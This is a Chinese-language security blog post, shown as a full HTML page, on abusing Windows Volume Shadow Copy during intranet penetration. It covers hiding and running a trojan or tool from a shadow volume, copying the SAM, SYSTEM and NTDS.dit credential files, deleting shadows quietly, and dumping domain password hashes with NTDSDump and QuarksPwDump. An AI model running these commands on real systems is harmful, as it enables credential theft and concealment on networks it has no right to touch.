<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Volume Shadow小技巧 | EvilAnne&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。">
<meta property="og:type" content="article">
<meta property="og:title" content="Volume Shadow小技巧">
<meta property="og:url" content="http://yoursite.com/2017/07/08/Volume-Shadow小技巧/index.html">
<meta property="og:site_name" content="EvilAnne's Blog">
<meta property="og:description" content="在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。">
<meta property="og:image" content="http://i.imgur.com/RJ0HpSJ.jpg">
<meta property="og:image" content="http://i.imgur.com/nOV0Poq.jpg">
<meta property="og:image" content="http://i.imgur.com/HlppbjV.jpg">
<meta property="og:image" content="http://i.imgur.com/ajgSunC.jpg">
<meta property="og:image" content="http://i.imgur.com/rT56Vh2.jpg">
<meta property="og:updated_time" content="2017-07-09T08:21:17.296Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Volume Shadow小技巧">
<meta name="twitter:description" content="在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。">
<meta name="twitter:image" content="http://i.imgur.com/RJ0HpSJ.jpg">
  
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">EvilAnne&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">个人博客</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
      </nav>
      <nav id="sub-nav">
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Volume-Shadow小技巧" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/07/08/Volume-Shadow小技巧/" class="article-date">
  <time datetime="2017-07-08T09:08:09.000Z" itemprop="datePublished">2017-07-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Volume Shadow小技巧
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="http://i.imgur.com/RJ0HpSJ.jpg" alt=""></p>
<blockquote>
<p>在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。</p>
</blockquote>
<a id="more"></a>
<h3 id="什么是卷影副本"><a href="#什么是卷影副本" class="headerlink" title="什么是卷影副本?"></a>什么是卷影副本?</h3><p>卷影副本，也称为快照，是存储在 Data Protection Manager (DPM) 服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。</p>
<h4 id="支持操作系统"><a href="#支持操作系统" class="headerlink" title="支持操作系统!"></a>支持操作系统!</h4><p>Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows 8</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>Powershell下执行：<br><code>gwmi Win32_ShadowCopy|select -Property DeviceObject</code>查看是否有创建卷影<br><img src="http://i.imgur.com/nOV0Poq.jpg" alt=""><br>当前系统没有显示为空</p>
<h4 id="vssadmin命令"><a href="#vssadmin命令" class="headerlink" title="vssadmin命令"></a>vssadmin命令</h4><p>常用命令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vssadmin List Shadows  列出现有卷影副本</span><br><span class="line">Add ShadowStorage     - 新加卷影副本存储关联</span><br><span class="line">Create Shadow         - 创建新的卷影副本</span><br><span class="line">Delete Shadows        - 删除卷影副本</span><br><span class="line">Delete ShadowStorage  - 删除卷影副本存储关联</span><br><span class="line">List Providers        - 列出已注册的卷影副本提供程序</span><br><span class="line">List Shadows          - 列出现有卷影副本</span><br><span class="line">List ShadowStorage    - 列出卷影副本存储关联</span><br><span class="line">List Volumes          - 列出可以进行卷影副本处理的卷</span><br><span class="line">List Writers          - 列出订阅的卷影副本写入程序</span><br><span class="line">Resize ShadowStorage  - 重新调整卷影副本存储关联的大小</span><br><span class="line">Revert Shadow         - 将卷还原到卷影副本</span><br><span class="line">Query Reverts         - 查询正在进行的还原操作的进度。</span><br></pre></td></tr></table></figure>
<h4 id="创建卷副本"><a href="#创建卷副本" class="headerlink" title="创建卷副本"></a>创建卷副本</h4><p>在开始之前:<br>1.需要先创建好目录，并放入木马或程序<br>2.再创建新的卷影副本,利用卷影副本卷名来执行程序，并把卷影副本卷名中的 “?” 需要改为 “.”号执行程序</p>
<p>在创建副本之前需要把我们工具先放入目录中：<br><img src="http://i.imgur.com/HlppbjV.jpg" alt=""></p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vssadmin Create Shadow /<span class="keyword">for</span>=C：		创建新的卷影副本 </span><br><span class="line">成功地创建了 'C:\' 的卷影副本</span><br><span class="line">    卷影副本 ID: &#123;<span class="number">33</span>d2c8f4-c82d-<span class="number">45</span>fa-b9a7-<span class="number">4458</span>ee264d54&#125;</span><br><span class="line">    卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br></pre></td></tr></table></figure>
<p>再查看：<br><img src="http://i.imgur.com/ajgSunC.jpg" alt=""></p>
<p>执行程序：<br><code>\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\test\psexec.exe</code><br><img src="http://i.imgur.com/rT56Vh2.jpg" alt=""></p>
<h4 id="Copy-Files"><a href="#Copy-Files" class="headerlink" title="Copy Files"></a>Copy Files</h4><p>有些系统运行中的文件是不可复制的，比如像SAM</p>
<p><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\</code><br><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\</code><br><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\</code></p>
<p>PowerShell调用方法：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path <span class="string">"C:\Windows\System32\config\SYSTEM"</span> -ComputerName SERVER -localDestination <span class="string">"C:\temp\SYSTEM"</span></span><br><span class="line">Invoke-NinjaCopy -Path <span class="string">"C:\Windows\NTDS\NTDS.dit"</span> -ComputerName SERVER -localDestination <span class="string">"C:\temp\NTDS.dit"</span></span><br></pre></td></tr></table></figure>
<p>需要文件：<br><code>https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy</code></p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>除卷影副本，两条命令都可以使用。主要看具体情况<br><code>vssadmin Delete Shadows /shadow={ce51aaf6-5677-4423-86ac-45d064ef626e} /quiet</code><br><code>vssadmin Delete Shadows /For=C:</code></p>
<hr>
<p><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters</code>查询NTDS路径<br>获取域数据库</p>
<p><code>Windows\NTDS\ntds.dit</code><br><code>Windows\System32\config\SYSTEM</code><br><code>Windows\System32\config\SAM</code></p>
<p>NTDSDump导出域数据库hash值：<br><code>NTDSDump.exe -f ntds.dit -s SYSTEM -h -t john -o save.txt</code><br>或者：<br>QuarksPwDump.exe<br><code>QuarksPwDump --dump-hash-domain --with-history</code><br>导出本机域控历史hash值</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/07/08/Volume-Shadow小技巧/" data-id="ck4pc1dkl0037kc9q7209rt0d" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2017/07/16/命令Tricks/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          命令Tricks!
        
      </div>
    </a>
  
  
    <a href="/2017/06/25/这段时间以来/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">这段时间以来</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    <!-- Featured Tags -->

  
    <!-- Short About -->
<section class="visible-md visible-lg">
    <h5><a href="/about/">ABOUT ME</a></h5>
    <div class="short-about">

        

        

        <!-- SNS Link -->
        <ul class="list-inline">
            
            
            

            

            

            
            
            
            
        </ul>
    </div>
</section>

  
    
  <h5>RECENT POSTS</h3>
  <div class="widget">
    <ul>
      
        <li>
          <a href="/2019/10/04/《跃迁》读书记录/">《跃迁》读书记录</a>
        </li>
      
        <li>
          <a href="/2019/08/29/住院一周/">住院一周</a>
        </li>
      
        <li>
          <a href="/2019/08/03/生活利器/">生活利器</a>
        </li>
      
        <li>
          <a href="/2019/07/24/sudo提权/">sudo提权</a>
        </li>
      
        <li>
          <a href="/2019/06/24/LinuxPAM登录认证机制/">LinuxPAM登录认证机制</a>
        </li>
      
    </ul>
  </div>

  
    <!-- Friends Blog -->

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a><span class="archive-list-count">8</span></li></ul>
    </div>
  </div>


  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 EvilAnne<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>



<script src="/js/script.js"></script>

  </div>
</body>
</html>